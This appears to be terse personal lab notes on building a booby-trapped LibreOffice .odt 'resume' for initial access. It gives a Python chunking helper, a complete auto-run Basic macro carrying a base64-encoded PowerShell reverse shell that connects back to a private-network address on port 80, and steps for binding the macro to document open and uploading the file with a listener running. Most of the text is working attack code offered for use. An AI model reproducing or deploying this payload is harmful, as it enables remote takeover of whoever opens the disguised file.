I have a premade resume.odt file saved in documents that catches a reverse shell over port 80

To create a new one:

#### Step 1:
Save this PoC as a .py file
	swap out rev shell as needed (generate one online)
```python
#!/usr/bin/python

str = "powershell.exe -e "

n = 50

for i in range(0, len(str), n):
        print("Str = Str + " + '"' + str[i:i+n] + '"')

```
run it
	`python2 script.py`



#### Step 2: Create libreoffice file
`libreoffice`

#### Step 3: Insert Macro Code
https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d
here is a guide

tools > macros > organize macros > basic
new
	save name of macro whatever you want

new window will open up
add macro to odt file (replace str section with what we created earlier)
```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUA"
		Str = Str + "dwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdA"
		Str = Str + "AuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAo"
		Str = Str + "ACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA5ACIALAA4AD"
		Str = Str + "AAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4A"
		Str = Str + "dAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQ"
		Str = Str + "BbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAz"
		Str = Str + "ADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9AC"
		Str = Str + "AAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUA"
		Str = Str + "cwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaA"
		Str = Str + "ApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAg"
		Str = Str + "ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAG"
		Str = Str + "EAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMA"
		Str = Str + "SQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQ"
		Str = Str + "BuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABz"
		Str = Str + "AGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAH"
		Str = Str + "QAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4A"
		Str = Str + "ZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcw"
		Str = Str + "BlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAo"
		Str = Str + "AHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAH"
		Str = Str + "MAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUA"
		Str = Str + "bgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQ"
		Str = Str + "B0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7"
		Str = Str + "ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAG"
		Str = Str + "QAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwA"
		Str = Str + "ZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcw"
		Str = Str + "BoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAo"
		Str = Str + "ACkA"


    CreateObject("Wscript.Shell").Run Str
End Sub
```

#### Step 4: Save

ctrl s

#### Step 5: Set Macro to Automatically Run

Tools > Customize

Events > Open Document > Macro

Highlight OUR created Macro and click OK.

Ctrl + S

Upload file to exploit (have listener running)
